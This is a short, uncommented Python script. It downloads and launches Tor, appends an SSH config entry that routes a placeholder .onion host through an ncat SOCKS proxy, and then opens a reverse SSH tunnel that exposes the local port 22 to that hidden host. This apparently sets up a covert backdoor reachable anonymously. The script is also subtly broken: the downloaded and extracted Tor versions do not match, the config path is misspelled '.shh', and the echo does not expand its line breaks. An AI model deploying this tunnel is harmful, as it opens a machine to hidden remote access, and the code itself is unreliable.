import os
from time import sleep

def DownloadTor():
        os.system("wget https://www.torproject.org/dist/torbrowser/7.0.2/tor-browser-linux64-7.0.2_en-US.tar.xz")
        os.system("tar -xf tor-browser-linux64-7.0.1_en-US.tar.xz")
        os.system("tor-browser_en-US/Browser/TorBrowser/Tor/tor")

def addssshconfig():
    os.system("echo host hidden \n hostname <addr.onion> \n proxyCommand ncat --proxy 127.0.0.1:9050 --proxy-type socks5 %h %p >> ~/.shh/config")
    

DownloadTor()
sleep(30)
addssshconfig()
os.system("ssh -R 19999:localhost:22 hidden")